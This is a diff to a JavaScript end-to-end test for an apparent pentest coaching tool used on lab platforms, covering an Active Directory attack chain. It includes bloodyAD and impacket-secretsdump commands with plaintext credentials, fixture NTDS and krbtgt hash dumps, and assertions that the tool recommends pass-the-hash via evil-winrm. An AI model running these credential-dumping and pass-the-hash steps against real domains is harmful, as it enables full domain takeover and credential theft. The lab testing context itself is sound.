@@ -80,12 +80,60 @@ s = step("bloodyAD -d corp.local --host 10.0.0.5 -u svc-web -p 'Password1' add d
 ok(s.has('ad.control_paths'), 'escalate: the DCSync grant is recorded as a control path');
 ok(s.ready['dcsync'], 'escalate → the DCSync move is reachable');
 
-// 10. secretsdump → NTDS + krbtgt = domain owned.
+// 10. secretsdump → NTDS + krbtgt = domain owned. (A real, non-blank Administrator hash so it becomes a
+// usable pass-the-hash credential — a blank 31d6… hash is a disabled account and must NOT be surfaced.)
 s = step("impacket-secretsdump 'corp.local/svc-web:Password1'@10.0.0.5", ['[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
   '[*] Using the DRSUAPI method to get NTDS.DIT secrets',
-  'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+  'corp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::',
   'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fa5f6f6f6f6f6f6f6f6f6f6f:::', '[*] Cleaning up...'].join('\n'));
 ok(s.has('loot.ntds') && s.has('hash.krbtgt'), 'LOOT: DCSync dumps NTDS + krbtgt — the domain is owned');
 
-console.log(fail ? ('\nAD KILL CHAIN E2E: ' + fail + ' FAILURES') : '\nAD KILL CHAIN E2E: all passed — recon → domain compromise, no dead ends');
+// 11. After the dump, the coach must LAND THE PLANE: the top ready move is "own the domain via pass-the-hash"
+// (not coercion, which is a mere route to the DCSync you already have), the Administrator hash is a usable
+// credential, and the coercion move has retired.
+ok(s.has('credential.available'), 'LOOT: the dumped Administrator hash is surfaced as a usable credential');
+var adminCred = facts.values('credential.available').filter(function (v) { return String(v.user).toLowerCase() === 'administrator' && v.nthash === '32693b11e6aa90eb43d32c72a07ceea6'; });
+ok(adminCred.length === 1, 'LOOT: the Administrator credential carries the dumped NT hash (ready to pass-the-hash)');
+var ready = OBOL.pack.nextActions(facts, pack, {});
+ok(ready.length && ready[0].id === 'own-domain-pth', 'LOOT → the #1 next move is "Own the Domain — Pass-the-Hash as Administrator" (id=' + (ready[0] && ready[0].id) + ')');
+ok(!ready.some(function (a) { return a.id === 'coerce-auth'; }), 'LOOT → the coercion move has retired (obsoleted by loot.ntds), no longer steering you sideways');
+// the endgame move's win command carries the ☠ cash-in and pass-the-hash form
+var endgame = pack.filter(function (a) { return a.id === 'own-domain-pth'; })[0];
+ok(endgame && (endgame.commands || []).some(function (c) { return c.win && /evil-winrm/.test(c.run); }), 'the endgame move flags a win (☠ Pwn This Target) command');
+ok(endgame && (endgame.commands || []).some(function (c) { return /-H \{\{nthash\}\}|:\{\{nthash\}\}/.test(c.run); }), 'the endgame commands pass the NT hash (fills from the surfaced Administrator credential)');
+
+// The clutter test: owning the domain retires the credential-harvest + this-domain escalation routes, but
+// KEEPS shell access, persistence, cross-domain and mapping moves (useful in a larger lab).
+var readyIds = {}; ready.forEach(function (a) { readyIds[a.id] = 1; });
+// closed routes to THIS domain's DA — retired the moment you hold every hash
+['kerberoast', 'asrep-roast', 'shadow-credentials', 'adcs-esc', 'nxc-arsenal', 'bloodyad-acl', 'zerologon-check', 'password-spray', 'coerce-auth', 'wsus-abuse'].forEach(function (id) {
+  ok(!readyIds[id], 'retired after domain-owned: ' + id + ' no longer clutters the coach');
+});
+['own-domain-pth', 'lateral-exec'].forEach(function (id) {
+  ok(readyIds[id], 'kept after domain-owned (still useful): ' + id);
+});
+// CROSS-BOX LOOT stays available even after domain compromise — it yields material (SYSVOL/GPP creds,
+// gMSA/LAPS local-admin passwords not in the domain NTDS, SCCM NAA creds, readable shares) reusable on
+// OTHER boxes. These must NOT be obsoleted by owning this domain.
+function byId(id) { return pack.filter(function (a) { return a.id === id; })[0]; }
+['gpp-passwords', 'gmsa-read', 'laps-read', 'sccm-enum', 'smb-share-inventory'].forEach(function (id) {
+  var a = byId(id);
+  ok(a && !a.obsolete(facts), 'cross-box loot kept after domain-owned: ' + id + ' is not retired');
+});
+// …and the still-gated ones only surface when the avenue is actually open (based on what's possible):
+ok(byId('gmsa-read') && !byId('gmsa-read').eligible(facts), 'gmsa-read stays hidden with no gMSA indicator (ad.gmsa) — gated on what is possible');
+
+// Flag capture uses the EXISTING, already-profile-aware flag-hunt move (obol-local heritage) — not a
+// reinvented reader. It must offer a pass-the-hash form so the Administrator hash from a DCSync can read the
+// flags with no plaintext, and it must fill the platform's own flag names.
+var flagHunt = pack.filter(function (a) { return a.id === 'flag-hunt-windows'; })[0];
+ok(flagHunt, 'the dedicated flag-hunt move exists (not reinvented on the endgame move)');
+ok(flagHunt && (flagHunt.commands || []).some(function (c) { return /-H \{\{nthash\}\}/.test(c.run); }), 'flag-hunt has a pass-the-hash variant (reads flags with the dumped Administrator hash, no password)');
+ok(flagHunt && (flagHunt.commands || []).every(function (c) { return /\{\{flag_names_windows\}\}/.test(c.run); }), 'flag-hunt searches the profile-configured flag names ({{flag_names_windows}})');
+// and the platform token itself resolves per profile (HTB vs OffSec) through the existing helper
+var htbNames = OBOL.profile.windowsNameList(OBOL.profile.resolveFlagConfig({ platform: 'htb' }).names);
+var oscpNames = OBOL.profile.windowsNameList(OBOL.profile.resolveFlagConfig({ platform: 'oscp' }).names);
+ok(/root\.txt/.test(htbNames) && /proof\.txt/.test(oscpNames), 'the flag-name token resolves to the platform proof files (HTB root.txt, OffSec proof.txt)');
+
+console.log(fail ? ('\nAD KILL CHAIN E2E: ' + fail + ' FAILURES') : '\nAD KILL CHAIN E2E: all passed — recon → domain compromise → land the plane, no dead ends');
 process.exit(fail ? 1 : 0);
